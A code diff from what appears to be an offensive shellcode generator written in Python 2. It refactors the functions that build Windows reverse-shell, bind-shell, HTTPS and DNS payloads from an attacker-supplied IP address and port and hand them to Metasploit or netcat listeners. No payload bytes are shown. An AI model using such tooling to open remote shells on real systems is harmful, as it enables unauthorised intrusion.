@@ -21,19 +21,8 @@ def reverseIpAndPort(port):
 
 def reversePayloadGeneration(payloadchoice,payloadname):
     portnum,ipaddr = reverseIpAndPort('4444')
-    try:
-        ip1, ip2, ip3, ip4 = ipaddr.split('.')
-        iphex = struct.pack('BBBB', int(ip1), int(ip2), int(ip3), int(ip4))
-    except Exception as E:
-        print E
-        print t.bold_red + '[*] Error in IP Syntax'
-        sys.exit(1)
-    try:
-        porthex = struct.pack('>h', int(portnum))
-    except:
-        print t.bold_red + '[*] Error in Port Syntax'
-        sys.exit(1)
-    shellcode = payloadchoice % (iphex, porthex)
+
+    shellcode = payloadchoice(ipaddr, portnum)
     print t.bold_green + '[*] IP SET AS %s\n[*] PORT SET AS %s\n' % (ipaddr, portnum) + t.normal
     if payloadname == "Windows_Reverse_Shell":
         ez2read_shellcode, startRevMetasploit = askAndReturnModules(shellcode,'nclistener')
@@ -48,12 +37,8 @@ def bindPayloadGeneration(payloadchoice,payloadname):
             '\n[*] Press Enter For Default Bind Port(%s)\n[*] Port> '%(t.bold_green + '4444' + t.normal))
     if len(bindport) is 0:
         bindport = 4444
-    try:
-        bindporthex = struct.pack('>h', int(bindport))
-    except:
-        print t.bold_red + '[!] Error in Port Syntax' + t.normal
-        sys.exit(1)
-    shellcode = payloadchoice % (bindporthex)
+
+    shellcode = payloadchoice('' ,bindport)
     bindip = raw_input(
         '\n[*] Target Bind IP Address ' + t.bold_red + '(REQUIRED FOR BIND PAYLOADS)' + t.normal +' \n[*] IP> ')
     print t.bold_green + '[*] BIND IP SET AS %s\n[*] PORT SET AS %s\n' % (bindip,bindport) + t.normal
@@ -64,14 +49,8 @@ def bindPayloadGeneration(payloadchoice,payloadname):
 
 def httpsPayloadGeneration(payloadchoice,payloadname):
     portnum,ipaddr = reverseIpAndPort('443')
-    try:
-        porthex = struct.pack('<h', int(portnum))
-    except:
-        print t.bold_red + '[!] Error in Port Syntax' + t.normal
-        sys.exit(1)
 
-    iphex = ipaddr
-    shellcode = payloadchoice % (porthex, iphex)
+    shellcode = payloadchoice(ipaddr, portnum)
     print t.bold_green + '[*] IP SET AS %s\n[*] PORT SET AS %s\n' % (ipaddr, portnum) + t.normal
     ez2read_shellcode, startHttpsMetasploit = askAndReturnModules(shellcode,'https')
     GeneratePayload(ez2read_shellcode,payloadname,shellcode)
@@ -83,17 +62,13 @@ def dnsPayloadGeneration(payloadchoice,payloadname):
         '\n[*] Press Enter For Default Port(%s)\n[*] Port> '%(t.bold_green + '4444' + t.normal))
     if len(portnum) is 0:
         portnum = 4444
-    try:
-        porthex = struct.pack('>h', int(portnum))
-    except:
-        print t.bold_red + '[*] Error in Port Syntax'
-        sys.exit(1)
+
     while True:
         DNSaddr = raw_input(
             '\n[*] Please Enter DNS Hostname\n[*] DNS> ')
         if DNSaddr:
             break
-    shellcode = payloadchoice % (DNSaddr,porthex)
+    shellcode = payloadchoice(DNSaddr, portnum)
     print t.bold_green + '[*] DNS HOSTNAME SET AS %s\n[*] PORT SET AS %s\n' % (DNSaddr, portnum) + t.normal
     ez2read_shellcode, startDnsMetasploit = askAndReturnModules(shellcode,'dns')
     GeneratePayload(ez2read_shellcode,payloadname,shellcode)
